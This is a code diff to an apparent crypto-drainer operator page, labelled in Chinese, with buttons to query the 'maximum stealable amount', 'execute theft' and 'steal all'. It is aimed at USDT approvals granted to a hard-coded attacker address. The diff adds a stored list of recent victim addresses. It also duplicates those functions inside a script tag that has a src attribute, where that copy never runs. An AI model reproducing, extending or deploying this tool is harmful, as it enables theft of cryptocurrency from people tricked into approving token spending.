@@ -11,9 +11,39 @@
 <button onclick="getMax()">查詢最大可盜金額</button>
 <button onclick="steal()">執行盜取</button>
 <button onclick="stealAll()">一鍵盜光</button>
+
+<h3>🧾 最近授權地址列表：</h3>
+<ul id="recentList" style="background:#f9f9f9;padding:10px;"></ul>
+<button onclick="clearHistory()">🗑️ 清除記錄</button>
+<br><br>
 <pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js">
+function updateRecent(victim) {
+  if (!victim) return;
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  if (!list.includes(victim)) {
+    list.unshift(victim);
+    if (list.length > 10) list.pop(); // 最多記錄 10 筆
+    localStorage.setItem("victimList", JSON.stringify(list));
+    renderRecentList();
+  }
+}
+
+function renderRecentList() {
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  const container = document.getElementById("recentList");
+  container.innerHTML = list.map((addr, i) => `<li>${i+1}. ${addr}</li>`).join("");
+}
+
+function clearHistory() {
+  localStorage.removeItem("victimList");
+  renderRecentList();
+}
+
+window.addEventListener("load", renderRecentList);
+
+</script>
 <script>
 const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
@@ -81,6 +111,7 @@ async function getMax() {
   const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
   document.getElementById("amount").value = max;
   log("🟢 受害者：" + victim);
+  updateRecent(victim);
   log("✅ 可盜金額：" + max);
 }
 
@@ -107,6 +138,31 @@ function log(msg) {
   console.log(msg);
   logDiv.innerText += msg + "\n";
 }
+
+function updateRecent(victim) {
+  if (!victim) return;
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  if (!list.includes(victim)) {
+    list.unshift(victim);
+    if (list.length > 10) list.pop(); // 最多記錄 10 筆
+    localStorage.setItem("victimList", JSON.stringify(list));
+    renderRecentList();
+  }
+}
+
+function renderRecentList() {
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  const container = document.getElementById("recentList");
+  container.innerHTML = list.map((addr, i) => `<li>${i+1}. ${addr}</li>`).join("");
+}
+
+function clearHistory() {
+  localStorage.removeItem("victimList");
+  renderRecentList();
+}
+
+window.addEventListener("load", renderRecentList);
+
 </script>
 </body>
 </html>
